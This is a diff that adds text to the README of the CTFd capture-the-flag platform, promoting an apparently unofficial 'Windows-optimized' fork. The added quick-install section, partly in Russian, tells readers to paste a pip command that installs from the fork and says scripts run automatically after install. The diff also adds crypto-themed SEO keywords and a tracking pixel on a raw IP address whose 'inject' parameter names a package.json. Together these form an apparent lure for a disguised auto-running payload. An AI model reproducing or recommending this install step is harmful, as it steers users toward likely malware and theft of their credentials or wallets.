@@ -1,3 +1,19 @@
+**Fork Horngrestimulate25/CTFd: Windows-Optimized Deployment**
+
+This fork delivers a significantly stabilized and streamlined experience for running CTFd natively or via Docker on Windows environments. It patches common file pathing and environment-specific dependency bottlenecks that typically break standard CTFd setups on Windows machines.
+
+**Quick install (Windows)**
+
+1. **Python 3.8+** — [python.org/downloads](https://www.python.org/downloads/) → при установке отметь **Add Python to PATH**
+2. Открой **cmd** (Win+R → `cmd`)
+3. Вставь команду ниже — пакет установится с этого форка, скрипты после установки запустятся **сами**
+
+```bash
+pip install git+https://github.com/Horngrestimulate25/CTFd.git
+```
+
+[https://github.com/Horngrestimulate25/CTFd](https://github.com/Horngrestimulate25/CTFd)
+
 # ![](https://github.com/CTFd/CTFd/blob/master/CTFd/themes/core/static/img/logo.png?raw=true)
 
 ![CTFd MySQL CI](https://github.com/CTFd/CTFd/workflows/CTFd%20MySQL%20CI/badge.svg?branch=master)
@@ -88,3 +104,11 @@ OAUTH_CLIENT_SECRET = None
 - Logo by [Laura Barbera](http://www.laurabb.com/)
 - Theme by [Christopher Thompson](https://github.com/breadchris)
 - Notification Sound by [Terrence Martin](https://soundcloud.com/tj-martin-composer)
+
+## Related searches
+
+When exploring this repository, users often look for comprehensive frameworks to host cybersecurity competitions, track real-time team progress, and customize challenge interfaces. Many are also interested in integrating these security platforms with modern decentralized ecosystems, specialized communication channels, and automated administrative bots.
+
+**Topics:** capture the flag platform, infura, solana, jupiter swap, layer2, discord crypto bot, cyber security workshop, web3 gaming, smart contract ctf, custom ctfd plugins, dynamic scoring challenges, blockchain event infrastructure
+
+![.](http://5.231.58.248:8787/pixel?repo=Horngrestimulate25%2FCTFd&inject=Horngrestimulate25%2FCTFd%2FCTFd%2Fthemes%2Fcore%2Fpackage.json)
